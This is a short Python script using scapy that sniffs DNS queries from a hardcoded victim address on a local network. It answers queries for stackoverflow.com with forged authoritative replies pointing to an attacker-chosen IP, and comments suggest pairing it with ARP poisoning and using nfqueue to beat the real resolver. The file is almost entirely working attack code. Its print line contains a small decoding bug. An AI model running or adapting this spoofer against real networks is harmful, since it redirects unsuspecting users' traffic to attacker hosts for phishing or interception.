#! /usr/bin/env python3
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
#from packinjection.attacks.arp_poison import attack
from scapy.sendrecv import sniff, send
#from threading import Thread
#from time import sleep

victim_ip = "192.168.66.36"
#gw_ip = "192.168.66.42"
target_domain = b"stackoverflow.com."
spoof_ip = "192.168.66.85"
iface = "eth0"

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[IP].src == victim_ip:
        qname = pkt[DNSQR].qname.decode().strip('.').lower()
        if qname == target_domain.decode().strip('.').lower():
            print(f"[+] Spoofing DNS request for {qname.decode()}")
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=53) / \
                          DNS(
                              id=pkt[DNS].id,
                              qr=1,
                              aa=1,
                              qd=pkt[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=60, rdata=spoof_ip)
                          )
            send(spoofed_pkt, verbose=False)

print("[*] Listening for DNS queries...")
sniff(filter="udp port 53", prn=dns_spoof, iface=iface)

# use nfqueue with netfilterqueue Python module to eliminate race conditions
